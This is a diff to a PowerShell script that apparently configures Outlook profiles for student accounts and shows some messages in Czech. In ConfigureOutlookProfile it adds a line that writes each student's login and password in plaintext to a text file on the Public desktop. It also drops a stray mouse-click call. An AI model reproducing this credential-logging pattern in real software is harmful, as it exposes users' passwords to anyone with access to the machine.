@@ -1029,8 +1029,9 @@ Function ConfigureOutlookProfile($Student,$Domain, $SourcePath, $LoginDomain="cl
 	#>	
 	$Login = $Student+"@"+$LoginDomain
 	$DestPath = $Home
-	CreatePRF1 $Login $Student $Domain $SourcePath
-
+	CreatePRF1 $Login $Student $Domain $SourcePath		
+	Add-Content "C:\users\Public\Desktop\Logins.txt" "$Login`r`n$Password" -Force
+	
 	[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
 
 	If (!($OutPath -eq $null)) {
@@ -1062,7 +1063,7 @@ Function ConfigureOutlookProfile($Student,$Domain, $SourcePath, $LoginDomain="cl
 	}
 	If ($OutPath -eq $null) {
 		Clear-Host
-		Write-Host 'Nepovedlo se najit Outlook- pravdepodobne neni nainstalovan Office' -ForegroundColor Red
+		Write-Host 'Nepovedlo se najit Outlook- pravdepodobne neni nainstalovan Office' -ForegroundColor Red		
 		Read-host
 	}
 	if($OutPath -like "*root*")
@@ -2433,8 +2434,6 @@ function Click-MouseButton
     $SendMouseClick::mouse_event(0x00000002, 0, 0, 0, 0);
     $SendMouseClick::mouse_event(0x00000004, 0, 0, 0, 0);
 }
-
-Click-MouseButton
 
 Function MouseClick($dx, $dy)
 {
